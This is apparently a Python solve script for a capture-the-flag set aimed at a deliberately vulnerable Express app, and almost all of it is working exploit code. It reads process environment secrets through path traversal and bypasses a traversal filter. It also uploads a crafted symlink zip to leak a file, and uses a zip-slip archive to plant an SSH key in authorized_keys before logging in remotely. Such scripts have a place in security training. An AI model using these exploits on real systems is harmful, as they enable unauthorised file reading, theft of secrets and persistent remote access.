import requests
import re
import sys

def solveTask1(base_url):
    print("Solving first task...")
    burp0_url = base_url +"task1/cat?filename=../../../../proc/self/environ"
    burp0_headers = {"Connection": "close"}
    resp = requests.get(burp0_url, headers=burp0_headers)
    print(re.findall("jctf{.*}",resp.text)[0])

def solveTask2(base_url):
    print("Solving second task...")
    burp0_url = base_url +"task2/cat?filename=..././app.js"
    burp0_headers = {"Connection": "close"}
    resp = requests.get(burp0_url, headers=burp0_headers)
    print(re.findall("jctf{.*}",resp.text)[0])

def solveTask3(base_url):
    print("Solving third task...")
    burp0_url = base_url + "task3"
    burp0_headers = {"Cache-Control": "max-age=0", "Upgrade-Insecure-Requests": "1", "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryfWzQUeMonjGCzrkg", "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.97 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3", "Referer": "http://172.17.0.1:3000/task3", "Accept-Encoding": "gzip, deflate", "Accept-Language": "pl-PL,pl;q=0.9,en-US;q=0.8,en;q=0.7", "Connection": "close"}
    burp0_data = "------WebKitFormBoundaryfWzQUeMonjGCzrkg\r\nContent-Disposition: form-data; name=\"zipupload\"; filename=\"test.zip\"\r\nContent-Type: application/zip\r\n\r\nPK\x03\x04\n\x00\x00\x00\x00\x00D`rO}\x95\x1d2,\x00\x00\x00,\x00\x00\x00\x04\x00\x1c\x00testUT\t\x00\x03/z\xd2]/z\xd2]ux\x0b\x00\x01\x04\xe8\x03\x00\x00\x04\xe8\x03\x00\x00/home/express/vulnerable_express_app/flag.jsPK\x01\x02\x1e\x03\n\x00\x00\x00\x00\x00D`rO}\x95\x1d2,\x00\x00\x00,\x00\x00\x00\x04\x00\x18\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xa1\x00\x00\x00\x00testUT\x05\x00\x03/z\xd2]ux\x0b\x00\x01\x04\xe8\x03\x00\x00\x04\xe8\x03\x00\x00PK\x05\x06\x00\x00\x00\x00\x01\x00\x01\x00J\x00\x00\x00j\x00\x00\x00\x00\x00\r\n------WebKitFormBoundaryfWzQUeMonjGCzrkg\r\nContent-Disposition: form-data; name=\"uploadzip\"\r\n\r\nUpload ZIP\r\n------WebKitFormBoundaryfWzQUeMonjGCzrkg--\r\n"
    resp = requests.post(burp0_url, headers=burp0_headers, data=burp0_data, allow_redirects=False)
    resp = requests.get(base_url+resp.headers['Location'][2:]+'/test')
    print(re.findall("jctf{.*}",resp.text)[0])

def solveTask4(base_url, ssh_public_key, ssh_private_key):
    import os
    import subprocess
    from urlparse import urlparse
    print("Solving fourth task...")
    ssh_public_key = open(ssh_public_key,"r")
    authorized_keys = open("authorized_keys","w+")
    authorized_keys.write(ssh_public_key.read())
    ssh_public_key.close()
    authorized_keys.close()
    os.system("python evilarc.py --os=unix --path=home/express/.ssh/ authorized_keys")
    burp0_url = base_url + "task4"
    response = requests.post(base_url+"task4",files={'zipupload':('evil.zip',open('evil.zip','rb'),'application/zip')}, allow_redirects=False)
    os.system("rm evil.zip authorized_keys")
    result = subprocess.Popen("ssh -i {ssh_private_key} -p 2222 {user}@{host} {cmd}".format(ssh_private_key=ssh_private_key,user='express', host=urlparse(base_url).hostname, cmd='./flag'), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE).communicate()
    print(re.findall("jctf{.*}",str(result))[0])


if(len(sys.argv)!=4):
    print("Usage: python solve.py base_url (e.g. http://localhost:3000/) ssh_public_key_path ssh_private_key_path")
    exit(0)

solveTask1(sys.argv[1])
solveTask2(sys.argv[1])
solveTask3(sys.argv[1])
solveTask4(sys.argv[1],sys.argv[2],sys.argv[3])
